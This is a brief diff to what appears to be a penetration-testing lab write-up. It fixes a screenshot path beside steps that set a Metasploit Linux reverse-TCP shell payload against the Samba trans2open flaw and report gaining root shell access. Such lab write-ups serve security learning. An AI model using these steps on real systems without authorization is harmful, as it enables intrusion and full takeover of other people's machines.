@@ -75,7 +75,7 @@ steps:
 - set payload linux/x86/shell_reverse_tcp
 - run
 
-![exploit](trans2open_exploiting)
+![exploit](screenshots/trans2open_exploiting.png)
 
 **Result:**
 - Acquired root-level shell access.
